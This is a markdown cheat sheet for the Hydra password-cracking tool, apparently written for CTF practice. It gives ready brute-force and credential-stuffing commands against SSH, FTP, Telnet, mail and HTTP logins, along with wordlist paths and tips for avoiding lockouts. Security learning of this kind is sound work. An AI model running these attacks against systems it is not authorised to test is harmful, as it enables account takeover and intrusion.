# Hydra Cheat Sheet

THC Hydra — fast, flexible network service password cracking tool. Supports FTP, SSH, HTTP, SMTP, POP3, IMAP, Telnet, and many more.

## Syntax
```bash
hydra -l USERNAME -P WORDLIST TARGET SERVICE
```

---

## Key Flags

| Flag | Description |
|---|---|
| `-l username` | Single username |
| `-L users.txt` | File containing list of usernames |
| `-p password` | Single password to try |
| `-P wordlist.txt` | Password wordlist file |
| `-s PORT` | Non-default port |
| `-V` or `-vV` | Verbose — shows each attempt |
| `-t n` | Number of parallel threads (default 16) |
| `-w n` | Wait time between connections (seconds) |
| `-f` | Stop after first valid credential found |
| `-d` | Debug mode |

---

## Common Service Attacks

```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt TARGET ssh

# FTP brute force
hydra -l mark -P /usr/share/wordlists/rockyou.txt TARGET ftp

# Telnet brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET telnet

# POP3 brute force
hydra -l frank -P /usr/share/wordlists/rockyou.txt TARGET pop3

# IMAP brute force
hydra -l lazie -P /usr/share/wordlists/rockyou.txt TARGET imap

# SMTP brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET smtp

# HTTP POST form login
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-get /admin
```

---

## Alternative URL Syntax

```bash
# URL-style syntax (equivalent)
hydra -l mark -P rockyou.txt ftp://TARGET
hydra -l frank -P rockyou.txt ssh://TARGET
hydra -l user -P rockyou.txt pop3://TARGET
```

---

## Username Lists

```bash
# Try list of usernames with one password
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p "" TARGET telnet

# Credential stuffing — list of users AND passwords
hydra -L users.txt -P passwords.txt TARGET ssh
```

---

## Non-Standard Ports

```bash
# SSH on port 2222
hydra -l user -P rockyou.txt -s 2222 TARGET ssh

# HTTP on port 8080
hydra -l admin -P rockyou.txt -s 8080 TARGET http-get /
```

---

## Wordlists Quick Reference

| Wordlist | Path | Use Case |
|---|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | General passwords — 14M entries |
| unix_users.txt | `/usr/share/wordlists/metasploit/unix_users.txt` | Common Unix usernames |
| common.txt | `/usr/share/wordlists/dirb/common.txt` | Quick password attempts |
| SecLists | `/usr/share/seclists/` | Comprehensive collection by category |

**Note:** If rockyou.txt is compressed run: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

---

## Tips

- Use `-f` to stop immediately when a password is found — saves time in CTFs
- Use `-vV` to watch progress and confirm the attack is running
- Reduce threads with `-t 4` on unstable targets to avoid lockouts or crashes
- For web login forms, you need to identify the POST parameters and failure string — use Burp to capture the request first
- In CTF environments attacks should finish within 5 minutes — if it's taking longer check your syntax

---

## Other Password Attack Tools

| Tool | Purpose |
|---|---|
| **Medusa** | Similar to Hydra, modular design |
| **Ncrack** | High-speed parallel auth testing (Nmap project) |
| **CrackMapExec / NetExec** | Windows/AD environments — SMB, WinRM, LDAP |
| **Burp Suite Intruder** | Web login forms where Hydra HTTP modules don't work |
| **Hashcat** | Offline hash cracking — much faster than attacking live services |
| **John the Ripper** | Offline hash cracking |
